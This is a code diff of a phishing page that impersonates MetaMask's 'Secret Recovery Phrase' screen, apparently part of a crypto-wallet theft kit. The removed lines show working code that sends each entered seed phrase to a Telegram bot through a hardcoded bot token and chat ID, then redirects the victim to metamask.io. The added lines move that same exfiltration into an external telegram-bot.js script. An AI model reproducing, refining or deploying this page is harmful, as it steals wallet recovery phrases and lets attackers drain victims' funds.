@@ -4,9 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secret Recovery Phrase</title>
-  <!-- ✅ Favicon MetaMask transparent -->
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
 
@@ -186,7 +185,7 @@
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -235,6 +234,8 @@
   </main>
 
   <script src="bip39-words.js"></script>
+  <script src="telegram-bot.js"></script> <!-- Ton fichier externe ici -->
+
   <script>
     function generateInputs() {
       const container = document.getElementById("seedInputs");
@@ -305,23 +306,8 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "8085539833:AAGtsErLhAz9IzSMOaROgWVcRARu_jPOYQY"; // Remplace ici
-      const chatId = "6996434307";     // Remplace ici
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: "\n\n" + phrase.trim()
-        })
-      });
-
-      navigator.clipboard.writeText(phrase.trim());
-
-      setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
-      }, 800);
+      // Envoie à Telegram via fonction externe
+      sendToTelegram(phrase);
     }
 
     document.addEventListener("paste", function(e) {
@@ -338,7 +324,7 @@
         if (input) input.value = word;
       });
 
-      checkFieldsFilled(); // mise à jour bouton
+      checkFieldsFilled();
     });
 
     window.onload = generateInputs;
